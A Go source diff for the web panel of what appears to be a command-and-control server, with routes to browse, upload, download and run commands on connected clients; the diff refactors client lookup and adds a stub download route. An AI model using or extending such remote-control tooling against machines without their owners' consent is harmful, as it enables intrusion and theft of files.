@@ -39,6 +39,7 @@ func WebServer() {
 	r.GET("/fs/:clientid", getFilesystem)
 	r.POST("/ls/:clientid", listFiles)
 	r.POST("/upload/:clientid", uploadFile)
+	r.GET("/download/:clientid", downloadFile)
 	r.POST("/command/:clientid", execCMD)
 	r.POST("/kill/:clientid", sendKillswitch)
 	r.GET("/dump", dumpClients)
@@ -51,21 +52,36 @@ func WebServer() {
 	r.Run(":" + WebPort)
 }
 
-func uploadFile(c *gin.Context) {
+func downloadFile(c *gin.Context) {
+	// path, _ := c.GetPostForm("fileToDownload")
+	//
+	// c.FileAttachment("", "")
+}
+
+func clientCheck(c *gin.Context) (Client, error) {
 	id := c.Param("clientid")
 	idInt, err := strconv.Atoi(id)
 	if err != nil {
 		c.String(http.StatusInternalServerError, "Error happened, please make this a proper error later")
-		return
+		return Client{}, err
 	}
 
 	client, _, err := returnClient(idInt)
 	if err != nil {
-		return
+		return Client{}, err
 	}
 
 	if client.IsOnline == false {
 		c.String(http.StatusOK, "Client is currently offline!")
+		return Client{}, err
+	}
+
+	return *client, nil
+}
+
+func uploadFile(c *gin.Context) {
+	client, err := clientCheck(c)
+	if err != nil {
 		return
 	}
 
@@ -75,7 +91,7 @@ func uploadFile(c *gin.Context) {
 		log.Println(err)
 	}
 
-	resp, err := uploadFileC2(*client, *file, path)
+	resp, err := uploadFileC2(client, *file, path)
 	if err != nil {
 		e := fmt.Sprintf("Error happened executing command: %v\n", err)
 		c.String(http.StatusOK, e)
@@ -90,20 +106,8 @@ func uploadFile(c *gin.Context) {
 }
 
 func listFiles(c *gin.Context) {
-	id := c.Param("clientid")
-	idInt, err := strconv.Atoi(id)
+	client, err := clientCheck(c)
 	if err != nil {
-		c.String(http.StatusInternalServerError, "Error happened, please make this a proper error later")
-		return
-	}
-
-	client, _, err := returnClient(idInt)
-	if err != nil {
-		return
-	}
-
-	if client.IsOnline == false {
-		c.String(http.StatusOK, "Client is currently offline!")
 		return
 	}
 
@@ -137,7 +141,7 @@ func listFiles(c *gin.Context) {
 		client.ClientID, parentFolder)
 	list += parentFolderLink
 
-	resp, err := requestFiles(*client, path)
+	resp, err := requestFiles(client, path)
 	if err != nil {
 		e := fmt.Sprintf("Error happened executing command: %v\n", err)
 		list += e
@@ -157,7 +161,8 @@ func listFiles(c *gin.Context) {
 				client.ClientID, v.FullPath, v.Name)
 			list += entry
 		} else {
-			entry := fmt.Sprintf("<a id=\"pointer\">%v</a><br>", v.Name)
+			entry := fmt.Sprintf("<a hx-get=\"/download/%v\" hx-vals='{\"fileToDownload\": \"%v\"}' id=\"pointer\">%v</a><br>",
+				client.ClientID, v.FullPath+v.Name, v.Name)
 			list += entry
 		}
 	}
